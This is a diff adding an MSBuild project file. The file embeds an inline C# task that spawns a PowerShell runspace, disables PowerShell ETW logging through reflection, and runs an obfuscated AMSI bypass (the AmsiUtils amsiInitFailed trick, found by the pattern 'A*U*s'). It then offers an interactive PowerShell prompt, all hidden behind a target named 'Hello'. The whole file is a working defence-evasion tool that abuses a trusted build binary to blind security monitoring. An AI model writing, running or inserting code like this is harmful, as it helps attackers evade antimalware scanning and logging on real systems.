@@ -1,0 +1,98 @@
+
+<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003" ToolsVersion="4.0">
+    <ItemGroup>
+      <Reference Include="System" />
+      <Reference Include="System.Core" />
+      <Reference Include="System.Xml.Linq" />
+      <Reference Include="System.Data.DataSetExtensions" />
+      <Reference Include="Microsoft.CSharp" />
+      <Reference Include="System.Data" />
+      <Reference Include="System.Net" />
+      <Reference Include="System.Xml" />
+      
+    </ItemGroup>
+ <Target Name="Hello">
+    <ClassExample/>
+ </Target>
+ 
+ <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+ <Task>
+    <Using Namespace="System"/>                                                                                                                                                                                                            
+    <Using Namespace="System.Reflection"/>                                                                                                                                                                                                 
+    <Using Namespace="System.Diagnostics"/> 
+    <Using Namespace="System.Net"/>       
+    <Using Namespace="System.Management.Automation"/>   
+    <Reference Include="System.Management.Automation" />    
+                                                                                                                                                                                            
+    <Code Type="Class" Language="cs">                                                                                                                                                                                                      
+    <![CDATA[                                                                                                                                                                                                                              
+        using System;                                                                                                                                                                                                                      
+        using System.IO;  
+        using System.Text;                                                                                                                                                                                                                 
+        using System.Reflection;                                                                                                                                                                                                           
+        using Microsoft.CSharp;                                                                                                                                                                                                            
+        using System.Runtime.InteropServices;                                                                                                                                                                                              
+        using Microsoft.Build.Framework;                                                                                                                                                                                                   
+        using Microsoft.Build.Utilities;       
+        using System.Security.Cryptography;     
+        using System.Net; 
+        using System.Management.Automation;
+        using System.Management.Automation.Runspaces;
+        using System.Collections.ObjectModel;
+
+                                                                                                                                                                                      
+        public class ClassExample : Task, ITask                                                                                                                                                                                            
+        {                                                                                                                                                                                                                                  
+            public override bool Execute()
+            {
+                Runspace rs = RunspaceFactory.CreateRunspace();
+            rs.Open();
+            PowerShell ps = PowerShell.Create();
+            ps.Runspace = rs;
+            Console.WriteLine();
+	    var PSEtwLogProvider = ps.GetType().Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider");
+            if (PSEtwLogProvider != null){
+            	var EtwProvider = PSEtwLogProvider.GetField("etwProvider", BindingFlags.NonPublic | BindingFlags.Static);
+                var EventProvider = new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid());
+                EtwProvider.SetValue(null, EventProvider);
+            }
+            String cmd = "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) { if ($b.Name -clike \"A*U*s\") {$c =$b; break} };$d =$c.GetFields('NonPublic,Static');Foreach($e in $d) { if ($e.Name -like \"*Init*\") {$f =$e} };$f.SetValue($null, $true);";
+            ps.AddScript(cmd);
+            ps.Invoke();
+            Console.Write("PS " + Directory.GetCurrentDirectory()+">");
+            while ((cmd = Console.ReadLine()) != null){
+                ps.AddScript(cmd);
+                try{
+                    Collection<PSObject> psOutput = ps.Invoke();
+                    Collection<ErrorRecord> errors = ps.Streams.Error.ReadAll();
+                    foreach (ErrorRecord error in errors)
+                    {
+                        Console.WriteLine(error.ToString());
+                    }
+		    foreach (PSObject output in psOutput){
+                        if (output != null){
+                            Console.WriteLine(output.ToString());
+                        }
+                    }
+                }catch (Exception e){
+                    Console.WriteLine("**** ERROR ****");
+                    if (e.Message != null){
+                        Console.WriteLine(e.Message);
+                    }
+                    ps.Stop();
+                    ps.Commands.Clear();
+                }
+                ps.Commands.Clear();
+                Console.Write("PS " + Directory.GetCurrentDirectory()+">");    
+            }
+            rs.Close();
+            return true;
+            }
+            
+            
+        }
+        ]]>
+        </Code>
+    </Task>
+    </UsingTask>
+</Project>
